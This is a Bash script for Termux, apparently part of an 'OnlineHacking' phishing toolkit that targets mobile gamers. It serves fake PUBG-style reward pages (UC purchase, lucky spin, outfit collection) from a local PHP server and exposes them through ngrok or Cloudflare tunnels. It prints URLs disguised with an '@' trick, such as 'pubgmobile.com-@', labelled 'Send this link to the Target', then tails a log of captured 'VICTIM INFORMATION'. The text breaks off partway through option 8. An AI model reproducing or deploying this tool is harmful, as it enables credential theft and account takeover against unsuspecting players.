#!/bin/bash
clear
echo ""
echo ""
printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m OnlineHacking :\e[1;32m Join Telegram Channel \e[1;33m @OnlineHacking  !\e[0m"
sleep 4
echo ""
clear
echo ""
printf "\e[31m[\e[32m★\e[31m]\e[32m This Tool is only educational purpose and we are not responsible for kind of illegal activity done by this tool\e[m "
echo ""
echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Accepted This Notice \e[1;91m (Y/N) : \e[0m' option
echo""
echo""
wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
chmod +x *
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
cd /data/data/com.termux/files/usr/bin/OnlineHacking/
bash Logo.sh
bash Logo2.sh
echo ""
echo ""
                 echo -e $''   
                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m  You Want to Choose Phishing Option  \e[1;91m  > : \e[0m' option
                 echo ""
		 if [ $option = 01 ] || [ $option = 1 ]
                 then 
                           cd /data/data/com.termux/files/usr/bin/SUMAN
                           cd X-Suit/
			   echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
			   echo ""
read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Chack Link Server \e[1;91m (1/2/3) : \e[0m' option
echo""

HOST='127.0.0.1'
PORT='4444'



	echo ""		   
if [[ $option == *'N'* ]]; then
## Start ngrok
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."

    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
	sleep 3
exit
fi
if [[ $option == *'n'* ]]; then
## Start Cloudflared
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
	sleep 3
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi
			   
	
	
	
	
	
	
			  

                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
			   echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://w.com-@$cldflr_link                             
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$ngrok_url    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
			   echo ""
			   
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt

	          break;
		  
                  elif [ $option = 02 ] || [ $option = 2 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/SUMAN/
                           cd MidasBuy/         
                           echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
			   ./ngrok http 4444 > /dev/null 2>&1 &
			   link=$(curl -s -N http://127.0.0.1:4444/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
			   echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.pubgmobile.com-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
			   echo ""
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt


                  break;
                  elif [ $option = 03 ] || [ $option = 3 ]
	          then
                           cd /data/data/com.termux/files/usr/bin/SUMAN/
                           cd Collect-MC-Larent-Car/
                           echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
			   echo ""
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt 
 
                  
                 break;
                 elif [ $option = 04 ] || [ $option = 4 ]
	         then
                           cd /data/data/com.termux/files/usr/bin/SUMAN/
                           cd SPIN-EVENT/
                           echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
			   echo ""
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt
                  
                  
                  
                break;
                elif [ $option = 05 ] || [ $option = 5 ]
	        then 
                           cd /data/data/com.termux/files/usr/bin/SUMAN/
                           cd Collect-EVENT-LINE/
                           echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
			   echo ""
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt
                  
                 break;
                 elif [ $option = 06 ] || [ $option = 6 ]
	         then
                
                           cd /data/data/com.termux/files/usr/bin/SUMAN1/
                           cd X-Suit-LuckySpin/
			   echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
			   echo ""
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt 
                  
                break;
   elif [ $option = 07 ] || [ $option = 7 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/SUMAN1/
                           cd Godzilla-LuckySpin/         
                           echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
                           read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Click ENTER to Continue \e[1;91m (enter) : \e[0m' option
                           echo""
                           echo""
                           echo ""
			   echo ""
                           echo -e $" [\e[92m*\e[91m]\e[1;93m Online Hacking Server Connect... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m Server Status Chacking ... \e[0m  "
			   sleep 2
			   echo ""
			   echo -e $" [\e[1;92m*\e[1;91m]\e[1;93m Scan Live User Traffic Security ... \e[0m   "
			   sleep 2
			   echo ""
			   echo -e $" [\e[92m*\e[91m]\e[1;93m PHP Server Now Startng ... \e[0m  "
                           echo ""
			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
			   echo ""
                           echo ""
                           echo ""
echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
		           echo ""
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo ""
			   echo ""
                           echo -e " \e[91m[\e[92m*\e[91m]\e[1;93m \e[0m\e[1;36m Share Ngrok Link and Using "
			   echo ""
                           
                           if [[ -e OnlineHacking.txt ]]; then
                           > OnlineHacking.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f OnlineHacking.txt


                  break;
    elif [ $option = 08 ] || [ $option = 8 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/SUMAN1/
                           cd COLLECT-S19-ID/         
                           echo ""
			   echo ""
                           printf "\e[31m[\e[32m★\e[31m]\e[32m Manually Start Ngrok \e[m "
                           echo ""
			   echo ""
			   echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m Run-Ngrok  "
                           echo ""
			   echo ""
			   echo ""
